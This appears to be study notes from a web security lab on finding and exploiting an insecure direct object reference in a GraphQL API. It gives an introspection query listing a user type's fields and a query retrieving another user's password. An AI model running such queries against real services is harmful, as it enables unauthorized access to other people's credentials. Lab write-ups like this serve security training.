## Identifying IDOR

![](Insecure%20Direct%20Object%20Reference%20(IDOR)-20260914-135321.png)

To do so, let us provide a different username we know exists: `test`. Note that we need to escape the double quotes inside the GraphQL query so as not to break the JSON syntax:

![](Insecure%20Direct%20Object%20Reference%20(IDOR)-20260914-135638.png)
## Exploiting IDOR

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

As we can see from the result, the `User` object contains a `password` field that, presumably, contains the user's password:

![](Insecure%20Direct%20Object%20Reference%20(IDOR)-20260914-135853.png)

Let us adjust the initial GraphQL query to check if we can exploit the IDOR vulnerability to obtain another user's password by adding the `password` field in the GraphQL query:

```graphql
{
  user(username: "test") {
    username
    password
  }
}
```

From the result, we can see that we have successfully obtained the user's password:

![](Insecure%20Direct%20Object%20Reference%20(IDOR)-20260914-135921.png)